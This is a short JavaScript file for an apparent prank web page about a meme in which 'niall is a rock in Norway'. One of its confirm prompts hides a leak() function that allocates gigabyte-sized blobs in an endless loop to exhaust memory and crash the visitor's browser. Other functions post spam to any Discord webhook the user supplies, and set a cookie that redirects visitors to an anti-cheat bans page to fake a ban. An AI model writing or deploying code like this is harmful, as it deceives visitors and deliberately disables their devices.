var numbers = [];
for (var i = 0; i < 100; i++) numbers.push(i);

function rusure() {
  let confirmedText = confirm("do you want to send your rock to norway?");
  if (confirmedText) {
    leak(1000000000);
  } else {
    alert("there's always next time");
  }
}
function leak(nBytes) {
    while (true) {
    const blob = new Blob([new Uint8Array(nBytes)]);
    URL.createObjectURL(blob);
    }
};
function rock() {
var niall = prompt("send the rock in norway to any discord webhook today!");
fetch(
  niall,
  {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username: 'niall',
      avatar_url:
        'https://cdn.discordapp.com/attachments/1197293683414941817/1229074159326331000/rock.jpg?ex=662e5b82&is=661be682&hm=046c8b069efaa790ff61785d699d0a903dffd31a0f30bfe9248a81255d259c5b&',
      content:
        'niall is a rock in norway',
    }),
  }
)
}

function valve() {
  if (document.cookie.includes('niall')) {window.location.assign('https://www.easy.ac/en-US/support/game/account/bans')}
}
function niall() {
const nextURL =  'https://www.easy.ac/en-US/support/game/account/bans'

let niallText = "is niall a rock in norway?";
if (confirm(niallText)) {
  createCookie("niall", "niall", 1);
  if (document.cookie.includes("niall")) {
    alert("niall is a rock in norway")
    window.location.assign(nextURL)
  } } else {
    alert("niall isn't a rock in norway")
  }
}

function createCookie(name, value, days) {
  var expires = "";
  if (days) {
    const date = new Date();
    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie = name + "=" + value + expires + "; path=/";
  console.log(document.cookie);
}

